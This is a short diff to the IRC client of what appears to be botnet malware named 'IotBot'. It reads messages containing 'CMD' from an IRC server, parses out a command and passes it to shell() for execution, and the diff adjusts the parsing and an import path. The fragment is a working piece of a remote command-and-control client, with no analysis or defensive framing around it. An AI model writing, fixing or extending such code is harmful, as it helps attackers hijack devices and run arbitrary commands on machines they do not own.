@@ -1,7 +1,7 @@
 import socket
 import time
 
-from IotBot.addons.shell import shell
+from addons.shell import shell
 
 
 class IRC:
@@ -25,9 +25,10 @@ class IRC:
         time.sleep(1)
         # Get the response
         resp = self.irc.recv(2040).decode("UTF-8")
+        print(resp)
 
         if resp.find('CMD') != -1:
-            cmd = resp.split(" ")[1].replace('\n' , '').replace('\r', '')
+            cmd = resp.split(":")[1].replace('\n' , '').replace('\r', '')
             print(cmd)
             shell(cmd)
 
